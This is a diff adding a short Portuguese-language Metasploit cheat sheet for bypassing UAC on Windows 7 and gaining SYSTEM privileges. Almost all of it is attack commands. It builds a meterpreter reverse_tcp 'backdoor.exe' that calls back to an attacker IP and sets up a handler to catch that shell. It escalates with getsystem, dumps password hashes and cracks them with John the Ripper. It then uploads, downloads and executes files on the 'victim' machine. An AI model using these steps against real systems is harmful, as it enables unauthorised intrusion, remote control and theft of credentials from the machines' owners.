@@ -1,0 +1,59 @@
+Bypass UAC Win 7 / escalando privilégios
+
+msf > use exploit/windows/local/bypassuac
+      msf exploit(bypassuac) > show targets
+            ...targets...
+      msf exploit(bypassuac) > set TARGET <target-id>
+      msf exploit(bypassuac) > show options
+            ...show and set options...
+      msf exploit(bypassuac) > exploit
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=4444 X
+> /var/www/backdoor.exe
+
+
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.8
+set LPORT 4444
+exploit
+
+-------------------------------------------------------
+
+escalando privilegios
+
+
+getuid
+whoami
+use priv
+
+getsystem –h p  (verificar varias tecnicas)
+
+run bypassuac
+
+digitar o comando background para
+sair da sessão atual e sessions –i [número da nova sessão] para utilizamos a
+sessão criada pelo bypassuac
+
+getsystem e veja se a mensagem
+...got system (via technique 1) aparece.
+Caso positivo, utilize o comando getuid para ver se você está utilizando o usuário de
+autoridade de sistema: Server username: AUTORIDADE NT\SISTEMA
+
+
+Execute o comando para captura de hash:
+run post/windows/gather/hashdump
+Após esse processo, copiamos o hash e salvamos em um arquivo para depois
+quebra-lo com o John the Ripper.
+john --format=nt2 arquivo_com_hash.txt
+
+
+Envia um arquivo à máquina da vítima
+upload /etc/passwd c:\\
+Efetua o download de algum arquivo da vitima
+download c:\\Windows\\System32\\calc.exe
+Executa um arquivo na máquina da vítima
+execute -f c:\\Windows\\System32\\calc.exe 
+
